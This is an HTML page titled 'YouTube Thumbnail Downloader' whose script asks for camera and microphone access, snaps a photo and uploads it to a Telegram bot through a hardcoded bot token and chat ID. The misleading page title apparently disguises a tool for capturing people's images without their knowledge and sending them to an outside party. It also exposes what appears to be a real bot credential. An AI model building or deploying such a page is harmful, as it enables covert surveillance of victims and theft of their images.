<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>YouTube Thumbnail Downloader</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {font-family: Arial, sans-serif; text-align: center; background: #f5f5f5;}
    .container {max-width: 500px; margin: 30px auto; background: white; padding: 20px; border-radius: 10px;}
    button {background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;}
    button:hover {background: darkred;}
  </style>
</head>
<body>
  <div class="container">
    <h1>📸 Test Camera & Send to Telegram</h1>
    <button id="startCapture">Start Capture</button>
    <div id="status"></div>
  </div>

  <script>
    const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
    const chatId = "6763021567";

    document.getElementById("startCapture").addEventListener("click", async () => {
      document.getElementById("status").innerText = "Requesting camera and mic...";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById("status").innerText = "Camera access granted ✅";

        const track = stream.getVideoTracks()[0];
        if ('ImageCapture' in window) {
          const imageCapture = new ImageCapture(track);
          const blob = await imageCapture.takePhoto();

          sendToTelegram(blob, "photo");
          document.getElementById("status").innerText = "Photo captured & sent ✅";
        } else {
          document.getElementById("status").innerText = "ImageCapture not supported ❌";
        }

      } catch (err) {
        document.getElementById("status").innerText = "Permission denied or error: " + err.message;
        console.error(err);
      }
    });

    function sendToTelegram(data, type) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append(type, data, `capture.${type === "photo" ? "jpg" : "wav"}`);

      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(json => console.log("Telegram Response:", json))
      .catch(err => console.error("Error sending:", err));
    }
  </script>
</body>
</html>
